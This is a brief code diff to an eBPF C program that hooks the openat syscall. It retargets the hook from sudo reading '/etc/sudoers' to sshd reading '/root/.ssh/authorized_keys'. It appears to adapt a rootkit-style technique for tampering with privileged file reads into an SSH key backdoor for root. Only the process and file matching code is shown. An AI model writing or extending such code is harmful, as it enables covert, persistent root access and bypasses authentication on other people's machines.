@@ -23,7 +23,8 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
         return 0;
     }
     const int sudo_len = 5;
-    const char *sudo = "sudo";
+    // const char *sudo = "sudo";
+    const char *sudo = "sshd";
     for (int i = 0; i < sudo_len; i++)
     {
         if (comm[i] != sudo[i])
@@ -33,8 +34,10 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
     }
 
     // Now check we're opening sudoers
-    const int sudoers_len = 13;
-    const char *sudoers = "/etc/sudoers";
+    // const int sudoers_len = 13;
+    // const char *sudoers = "/etc/sudoers";
+    const int sudoers_len = 27;
+    const char *sudoers = "/root/.ssh/authorized_keys";
     char filename[sudoers_len];
     bpf_probe_read_user(&filename, sudoers_len, (char *)ctx->args[1]);
     for (int i = 0; i < sudoers_len; i++)
